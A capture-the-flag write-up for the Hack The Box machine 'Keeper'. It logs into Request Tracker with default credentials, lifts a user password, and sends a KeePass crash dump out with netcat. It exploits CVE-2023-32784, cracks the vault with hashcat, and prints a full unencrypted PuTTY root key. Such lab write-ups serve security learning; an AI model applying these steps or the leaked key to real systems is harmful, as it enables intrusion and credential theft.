# NMAP

`sudo nvim /etc/hosts`

`10.10.11.227 tickets.keeper.htb`

sudo nmap 10.10.11.227 -sC -sV -sA

```bash
sudo nmap 10.10.11.227 -sC 
[sudo] password for angelo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-08 16:03 CET
Nmap scan report for keeper.htb (10.10.11.227)
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
```

# USER

We can see a ticket manager by `Best Practical`.
Ticket tracker default credentials

first result from google

```
Log in. Use a browser to log into RT. Username is root , and password is password .
```


And we're in.

We've a ticket between 2 users which talks about a keepass file crash report send because of a bug in keepass.
This is helpful for root exploitation.

Searching in the dashboard we can find credentials of another administrator at

`http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27`

```
lnorgaard
lnorgaard@keeper.htb
lnorgaard@keeper.htb


New user. Initial password set to Welcome2023!
```

ssh connection with 

`ssh lnorgaard@10.10.11.227`

with such password == user flag.

# ROOT

```bash
receive file: nc -l -p 12344 > RT30000.zip
send file: nc 10.10.16.75 12344 < RT30000.zip
```

```
file KeePassDumpFull.dmp
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
```

KeePass suffered a recent CVE `CVE-2023-32784`, which allow to get quite the entire password of the db from a dump report.

```
python3 poc.py -d ../assets/KeePassDumpFull.dmp 
2024-01-08 16:54:57,145 [.] [main] Opened ../assets/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```
we have 3 chars unknown per each possible password.
Considering all printable chars which are

```python
bpython
import string
len(string.printable)

100

print(100**3)
```

1000000 = one million of possibilites * 13 passwords. 
Total of `13000000` attempts maximum. Its quite possible to make a bruteforce

Let's create a wordlist then

```python
import string
import itertools

replace_char = "●"
substitution = string.printable

print("Substitutions on " + substitution)
replacements_list = []


def generate_permutations_with_replacement(charset, string_with_placeholders):
    placeholder_positions = [i for i, char in enumerate(string_with_placeholders) if char == replace_char]
    replacements = itertools.product(charset, repeat=len(placeholder_positions))

    global replacements_list

    for replacement_combination in replacements:
        replaced_string = list(string_with_placeholders)
        for position, replacement_char in zip(placeholder_positions, replacement_combination):
            replaced_string[position] = replacement_char
        replacements_list.append(''.join(replaced_string))


with open("inputs.txt","r") as file:
    print("Generating substitutions")
    for i, psw in enumerate(file, start=1):
        generate_permutations_with_replacement(substitution, psw)    
    print(len(replacements_list))

print("Saving wordlist to a file...")

with open("wordlist.txt","w") as file:
    for x in replacements_list:
        file.write(str(x) +'\n')
```

Using john utility to extract hash from file.

keepass -> john -> hashcat

```bash
> keepass2john assets/passcodes.kdbx | grep -o "$keepass$.*" >  key_to_hash.txt

> hashcat -a 0 -m 13400 key_to_hash.txt wordlist.txt
```

Haschat says that it will take 4 hourse to crack the hash.

The latest password seems to have some meanings or at least is the most meaningful.

Googling the last password we get this

https://www.thespruceeats.com/rodgrod-med-flode-danish-red-berry-pudding-2952748

The article talks about `Rødgrød Med Fløde`.
I made a lot of attempts here trying to access the keepass db and at the end I managed the the correct password was to lower case the entire password `rødgrød med fløde`.
real keepass applicatoin for linux, crashes when inserting `rødgrød med fløde` as key master manager password.

I had to use `kpcli` from terminal to have access to the db.

```bash
export KEEPASSDB=/home/angelo/HTB/KEEPER/assets/passcodes.kdbx


kpcli ls                                                                                         
Database: /home/angelo/HTB/KEEPER/assets/passcodes.kdbx
UNLOCKING...

Database password: 
======================================================================
Groups
======================================================================
eMail
General
Homebanking
Internet
Network
passcodes
Recycle Bin
Windows
```

But this tools sucks a lot and was difficult to recover some data using it. It was useful only to check the password.
I used a tool found online to open kepass databases which seems to work pretty well!

`https://app.keeweb.info`

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Needs to convert `ppk` putty format to ssh format.

`yay -S putty` to install utils like puttygen.

```bash
puttygen root.ppk -O private-openssh -o root.ssh
chmod 600 root.ssh
```